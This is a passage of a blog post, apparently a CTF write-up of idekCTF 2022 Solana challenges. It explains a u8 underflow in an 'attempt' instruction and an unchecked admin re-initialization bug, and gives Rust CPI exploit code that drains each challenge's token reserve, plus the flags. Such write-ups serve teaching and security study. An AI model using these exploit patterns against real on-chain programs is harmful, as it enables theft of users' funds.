+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Rust" data-lang="Rust"><span class="line"><span class="cl"><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">attempt</span><span class="p">(</span><span class="n">ctx</span>: <span class="nc">Context</span><span class="o">&lt;</span><span class="n">Attempt</span><span class="o">&gt;</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">()</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">record</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">record</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">msg</span><span class="o">!</span><span class="p">(</span><span class="s">&#34;[CHALL] attempt.tries {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">record</span><span class="p">.</span><span class="n">tries</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">record</span><span class="p">.</span><span class="n">tries</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">withdraw_ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CpiContext</span>::<span class="n">new_with_signer</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">token_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Transfer</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">from</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">reserve</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">to</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user_account</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">authority</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">reserve</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">signer</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">token</span>::<span class="n">transfer</span><span class="p">(</span><span class="n">withdraw_ctx</span><span class="p">,</span><span class="w"> </span><span class="n">record</span><span class="p">.</span><span class="n">tries</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="kt">u64</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">record</span><span class="p">.</span><span class="n">tries</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nb">Ok</span><span class="p">(())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>If you take a closer look at the code, you&rsquo;ll notice that <code>record.tries</code> is decremented OUTSIDE of the <code>if</code> statement. This means that even when we have 0 tries, we can still invoke this instruction to decrement it further. Because the tries value is declared as a <code>u8</code>, decrementing it below 0 will cause an integer underflow, resulting in a value of 255. As a consequence, the next <code>Attempt</code> will withdraw 255 tokens from the reserve account. To exploit this vulnerability, we simply need to invoke <code>Attempt</code> 4 times in a row.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Rust" data-lang="Rust"><span class="line"><span class="cl"><span class="kd">let</span><span class="w"> </span><span class="n">cpi_accounts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chall</span>::<span class="n">cpi</span>::<span class="n">accounts</span>::<span class="n">Attempt</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">reserve</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">reserve</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">record</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user_record</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">user_account</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user_account</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">mint</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">mint</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">user</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">token_program</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">token_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">cpi_ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CpiContext</span>::<span class="n">new</span><span class="p">(</span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">chall</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w"> </span><span class="n">cpi_accounts</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chall</span>::<span class="n">cpi</span>::<span class="n">attempt</span><span class="p">(</span><span class="n">cpi_ctx</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// copy &amp; paste 3 more times
+</span></span></span></code></pre></div><p>The flag for this challenge is <code>idek{9ad7116e-468a-4968-b579-54a9b4964d9e}</code></p>
+<p>This vulnerability is fixed in <code>Blockchain 3</code> by putting <code>record.tries -= 1;</code> into the <code>if</code> statement.</p>
+<h3 id="the-3rd-vulnerability-admin-re-initialization">The 3rd vulnerability: Admin Re-initialization</h3>
+<p>Remember when I mentioned that the <code>Initialize</code> instruction is not to be ignored in this case? Indeed, as it turns out, the final vulnerability resides there. This instruction is utilized to establish an <code>admin</code> for the global <code>config</code> account. However, there is no mechanism in place to verify the identity of the given <code>admin</code>, or to check if the <code>config</code> account already has an existing <code>admin</code>. As a result, ANY user can execute this instruction and designate themselves as the <code>admin</code>. This is quite a sneaky bug that took me a bit longer to identify.</p>
+<p>To exploit this vulnerability, simply set our user to be the admin using <code>Initialize</code>, and then withdraw all the tokens using <code>Deposit</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Rust" data-lang="Rust"><span class="line"><span class="cl"><span class="kd">let</span><span class="w"> </span><span class="n">cpi_accounts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chall</span>::<span class="n">cpi</span>::<span class="n">accounts</span>::<span class="n">Initialize</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">config</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">reserve</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">reserve</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">mint</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">mint</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">admin</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">token_program</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">token_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">system_program</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">system_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">rent</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">rent</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">cpi_ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CpiContext</span>::<span class="n">new</span><span class="p">(</span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">chall</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w"> </span><span class="n">cpi_accounts</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chall</span>::<span class="n">cpi</span>::<span class="n">initialize</span><span class="p">(</span><span class="n">cpi_ctx</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">cpi_accounts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">chall</span>::<span class="n">cpi</span>::<span class="n">accounts</span>::<span class="n">Deposit</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">config</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">config</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">reserve</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">reserve</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">user_account</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user_account</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">mint</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">mint</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">admin</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">user</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">user</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">token_program</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">token_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">system_program</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">system_program</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">rent</span>: <span class="nc">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">rent</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">let</span><span class="w"> </span><span class="n">cpi_ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CpiContext</span>::<span class="n">new</span><span class="p">(</span><span class="n">ctx</span><span class="p">.</span><span class="n">accounts</span><span class="p">.</span><span class="n">chall</span><span class="p">.</span><span class="n">to_account_info</span><span class="p">(),</span><span class="w"> </span><span class="n">cpi_accounts</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chall</span>::<span class="n">cpi</span>::<span class="n">deposit</span><span class="p">(</span><span class="n">cpi_ctx</span><span class="p">,</span><span class="w"> </span><span class="mi">1000</span><span class="p">)</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>The flag for this challenge is <code>idek{4dc99b34-712e-4c6a-952d-4fd0fbac6f6b}</code></p>
+<h2 id="appendix">Appendix</h2>
+<ul>
+<li>All challenge sources and solutions can be found <a href="https://github.com/lkmidas/Web3-CTF-Collection/tree/main/idekctf2022" target="_blank" rel="noopener noreffer ">here</a>.</li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-03-03</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://lkmidas.github.io/posts/20230303-idekctf2022-writeups/" data-title="idekCTF 2022 Solana Challenges Write-up" data-via="_lkmidas"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://lkmidas.github.io/posts/20230303-idekctf2022-writeups/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://lkmidas.github.io/posts/20230303-idekctf2022-writeups/" data-title="idekCTF 2022 Solana Challenges Write-up"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://lkmidas.github.io/posts/20230303-idekctf2022-writeups/" data-title="idekCTF 2022 Solana Challenges Write-up"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://lkmidas.github.io/posts/20230303-idekctf2022-writeups/" data-title="idekCTF 2022 Solana Challenges Write-up"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/20221128-n1ctf2022-writeups/" class="prev" rel="prev" title="N1CTF 2022 Solana Challenges Writeups"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>N1CTF 2022 Solana Challenges Writeups</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":60},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-HGQHGNF9HJ');
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-HGQHGNF9HJ" async></script></body>
+</html>
